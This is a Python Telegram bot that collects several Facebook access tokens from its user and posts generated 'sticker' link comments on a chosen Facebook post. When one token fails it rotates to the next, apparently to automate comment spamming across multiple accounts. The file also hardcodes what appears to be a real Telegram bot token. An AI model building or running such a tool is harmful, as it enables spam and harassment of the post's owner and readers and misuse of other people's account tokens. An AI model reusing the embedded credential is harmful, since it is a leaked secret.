import requests
import random
import time
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler

# Telegram Bot Token
TELEGRAM_BOT_TOKEN = "7635741820:AAGAks8tA7qTJb5W6lSOpE1uMqG2Y9POvdg"

# Sticker Styles
STICKER_STYLES = ["bold", "italic", "outline", "shadow", "neon", "3d", "colorful"]

# Steps for ConversationHandler
TOKEN_COUNT, GET_TOKENS, GET_POST_ID, GET_DELAY, TEXT_INPUT = range(5)

# ✅ Function to Generate Sticker URL
def generate_sticker(text, style):
    return f"https://dummy-sticker-api.com/{style}/{text}.png"

# ✅ Function to Post Comment on Facebook
def post_comment(token, post_id, sticker_url):
    url = f"https://graph.facebook.com/v15.0/{post_id}/comments"
    payload = {"access_token": token, "message": sticker_url}
    response = requests.post(url, json=payload)
    return response.status_code == 200

# ✅ Start Command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🤖 Enter the number of Facebook tokens you want to use:")
    return TOKEN_COUNT

# ✅ Get Number of Tokens
async def get_token_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        token_count = int(update.message.text)
        if token_count < 1:
            raise ValueError
        context.user_data["token_count"] = token_count
        context.user_data["tokens"] = []
        await update.message.reply_text(f"✅ Send {token_count} tokens one by one.")
        return GET_TOKENS
    except ValueError:
        await update.message.reply_text("❌ Please enter a valid number (1 or more).")
        return TOKEN_COUNT

# ✅ Get Tokens One by One
async def get_tokens(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["tokens"].append(update.message.text)
    token_count = context.user_data["token_count"]
    
    if len(context.user_data["tokens"]) < token_count:
        await update.message.reply_text(f"✅ Token {len(context.user_data['tokens'])} saved. Send the next one.")
        return GET_TOKENS

    await update.message.reply_text("✅ All tokens saved! Now enter the **Facebook Post ID**:")
    return GET_POST_ID

# ✅ Get Post ID
async def get_post_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["post_id"] = update.message.text
    await update.message.reply_text("✅ Post ID saved! Now enter the **delay (in seconds)**:")
    return GET_DELAY

# ✅ Get Delay Time
async def get_delay(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        delay = int(update.message.text)
        if delay < 0:
            raise ValueError
        context.user_data["delay"] = delay
        await update.message.reply_text(f"✅ Delay set to {delay} seconds. Now send your text to create a sticker.")
        return TEXT_INPUT
    except ValueError:
        await update.message.reply_text("❌ Please enter a valid number.")
        return GET_DELAY

# ✅ Handle User Text for Sticker Generation
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_text = update.message.text
    post_id = context.user_data.get("post_id")
    delay = context.user_data.get("delay", 5)  # Default 5 sec
    tokens = context.user_data.get("tokens", [])

    if not post_id or not tokens:
        await update.message.reply_text("❌ Missing Facebook token or post ID. Start again using /start")
        return TEXT_INPUT

    style = random.choice(STICKER_STYLES)
    sticker_url = generate_sticker(user_text, style)

    for token in tokens:
        success = post_comment(token, post_id, sticker_url)
        if success:
            await update.message.reply_text(f"✅ Sticker sent successfully!\n{sticker_url}")
            await asyncio.sleep(delay)  # Delay before next comment
            return TEXT_INPUT
        else:
            await update.message.reply_text(f"❌ Failed with token {token[:10]}... trying next.")

    await update.message.reply_text("❌ All tokens failed! Check your tokens.")
    return TEXT_INPUT

# ✅ Stop Command
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🛑 Stopping the process.")
    return ConversationHandler.END

# ✅ Main Function
def main():
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            TOKEN_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_token_count)],
            GET_TOKENS: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_tokens)],
            GET_POST_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_post_id)],
            GET_DELAY: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_delay)],
            TEXT_INPUT: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text)],
        },
        fallbacks=[CommandHandler("stop", stop)]
    )

    app.add_handler(conv_handler)
    app.run_polling()

if __name__ == "__main__":
    main()
